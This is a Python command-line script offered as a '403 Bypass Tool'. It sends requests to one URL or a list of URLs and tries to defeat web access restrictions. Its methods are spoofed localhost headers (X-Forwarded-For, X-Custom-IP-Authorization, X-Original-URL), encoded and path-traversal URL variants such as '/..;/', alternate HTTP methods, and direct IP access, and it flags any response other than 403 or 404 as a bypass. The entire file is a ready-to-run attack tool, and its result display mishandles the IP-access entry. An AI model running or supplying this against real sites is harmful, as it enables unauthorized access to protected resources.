import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import random
import threading
from urllib.parse import quote, urlparse
import socket
import argparse
import sys

# List of User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.17763 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
]

# Advanced Headers for 403 Bypass
HEADERS_LIST = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Original-URL': '/'},
    {'Referer': 'https://www.google.com/'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'User-Agent': random.choice(USER_AGENTS)},
]

# Common HTTP Methods to try
HTTP_METHODS = ['GET', 'POST', 'OPTIONS', 'HEAD']

# Path modifications to try
PATH_MODS = [
    '/',
    '/.',
    '/..',
    '/..;/',
    '/%2e',
    '/%2e%2e',
]

def setup_session():
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[403, 500])
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))
    return session

def attempt_bypass(url, session):
    print(f"\n[*] Testing bypass techniques on: {url}")
    results = []

    # Try different headers
    for headers in HEADERS_LIST:
        response = session.get(url, headers=headers)
        results.append((headers, response.status_code))
    
    # Try encoding just the path, not the full URL
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    encoded_path = quote(parsed_url.path)
    double_encoded_path = quote(encoded_path)
    
    # Make requests with encoded paths
    for encoded in [encoded_path, double_encoded_path]:
        encoded_url = f"{base_url}{encoded}"
        response = session.get(encoded_url)
        results.append(({'Encoding': 'URL' if encoded == encoded_path else 'Double URL'}, response.status_code))
    
    # Try path modifications
    for path_mod in PATH_MODS:
        modified_url = f"{base_url}{parsed_url.path}{path_mod}"
        response = session.get(modified_url)
        results.append(({'Path Modification': path_mod}, response.status_code))

    # Try different HTTP methods
    for method in HTTP_METHODS:
        response = session.request(method, url)
        results.append(({'method': method}, response.status_code))
    
    return results

def try_ip_access(url, session):
    # Resolve domain to IP and try direct IP access if 403 persists
    try:
        parsed_url = urlparse(url)
        ip = socket.gethostbyname(parsed_url.hostname)
        ip_url = f"{parsed_url.scheme}://{ip}{parsed_url.path}"
        response = session.get(ip_url)
        return {'IP Access': ip, 'Status Code': response.status_code}
    except Exception as e:
        print(f"[!] IP resolution failed: {e}")
        return None

def display_results(results):
    print("\n[+] Bypass Results:")
    for attempt, status in results:
        print(f"Attempt: {attempt} | Status Code: {status}")
        if status not in [403, 404]:
            print("Possible bypass achieved!")

def process_url(url, session):
    results = attempt_bypass(url, session)
    ip_result = try_ip_access(url, session)
    if ip_result:
        results.append(ip_result)
    display_results(results)

def main():
    parser = argparse.ArgumentParser(description="403 Bypass Tool")
    parser.add_argument("-u", "--url", help="Single URL to bypass 403 restrictions", type=str)
    parser.add_argument("-f", "--file", help="File containing URLs to test", type=str)

    args = parser.parse_args()

    if not args.url and not args.file:
        print("Please provide a URL with -u or a file with -f. Use -h for help.")
        sys.exit(1)

    session = setup_session()

    # Single URL mode
    if args.url:
        process_url(args.url, session)

    # File input mode
    if args.file:
        try:
            with open(args.file, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()
                    if url:
                        process_url(url, session)
        except FileNotFoundError:
            print(f"[!] Error: File '{args.file}' not found.")
            sys.exit(1)

if __name__ == "__main__":
    main()
